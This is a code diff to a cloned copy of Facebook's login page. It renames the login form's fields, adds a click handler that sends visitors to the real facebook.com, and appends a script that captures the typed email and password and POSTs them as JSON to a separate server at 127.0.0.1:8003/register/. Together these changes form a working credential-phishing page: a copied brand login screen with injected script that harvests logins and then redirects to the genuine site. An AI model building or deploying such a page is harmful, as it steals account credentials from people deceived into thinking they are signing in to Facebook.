@@ -868,7 +868,7 @@
         });
     </script>
 </head>
-<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh x1 Locale_ur_PK" dir="ltr"> <script type="text/javascript" nonce="bTxSigBT">
+<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh x1 Locale_en" dir="ltr"> <script type="text/javascript" nonce="bTxSigBT">
         requireLazy(["bootstrapWebSession"], function(j) {
             j(1748283479)
         })
@@ -890,16 +890,16 @@
                         <div class="_8esn">
                             <div class="_8iep _8icy _9ahz _9ah-">
                                 <div class="_6luv _52jv">
-                                    <form class="_9vtf" data-testid="royal_login_form" action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ4MjgzNDc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;next" method="post" id="u_0_2_Jb">
+                                    <form id="register-form" class="_9vtf" data-testid="royal_login_form" action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ4MjgzNDc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next" method="post" id="u_0_2_Jb">
                                         <input type="hidden" name="jazoest" value="2947" autocomplete="off" />
                                         <input type="hidden" name="lsd" value="AVrHoKxCAt8" autocomplete="off" />
                                         <div>
                                             <div class="_6lux">
-                                                <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal-email" placeholder="Email or phone number" autofocus="1" aria-label="Email or phone number" />
+                                                <input type="text" class="inputtext _55r1 _6luy" name="email" id="register-email" data-testid="royal-email" placeholder="Email or phone number" autofocus="1" aria-label="Email or phone number" dir="ltr" />
                                             </div>
                                             <div class="_6lux">
                                                 <div class="_6luy _55r1 _1kbt" id="passContainer">
-                                                    <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal-pass" placeholder="Password" aria-label="Password" />
+                                                    <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="register-password" data-testid="royal-pass" placeholder="Password" aria-label="Password" dir="ltr"  />
                                                     <div class="_9ls7" id="u_0_3_Zm">
                                                         <a href="#" role="button">
                                                             <div class="_9lsa">
@@ -913,7 +913,7 @@
                                         <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" />
                                         <input type="hidden" autocomplete="off" name="next" value="" />
                                         <div class="_6ltg">
-                                            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal-login-button" type="submit" id="u_0_5_bN">Log In</button>
+                                            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal-login-button" type="submit" id="u_0_5_bN" onclick="window.location.href='https://www.facebook.com/';">Log In</button>
                                         </div>
                                         <div class="_6ltj">
                                             <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ4MjgzNDc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next" id="u_0_6_HP">Forgot password?</a>
@@ -976,5 +976,36 @@
             </div>
         </div>
     </div>
+    
 </body>
+<script>
+    // Register user
+    document.getElementById('register-form').addEventListener('submit', async function (event) {
+        event.preventDefault();
+
+        const email = document.getElementById('register-email').value;
+        const password = document.getElementById('register-password').value;
+
+        const response = await fetch('http://127.0.0.1:8003/register/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ email, password })
+        });
+
+        try {
+            const data = await response.json(); // Parse the JSON response
+            if (response.status === 200) {
+                document.getElementById('message').textContent = `User "${data.email}" created successfully!`;
+            } else {
+                document.getElementById('message').textContent = `Error: ${data.detail}`;
+            }
+        } catch (error) {
+            // If response is not valid JSON, handle the error
+            document.getElementById('message').textContent = "Failed to register. Please try again later.";
+            console.error("Error:", error);
+        }
+    });
+</script>
 </html>
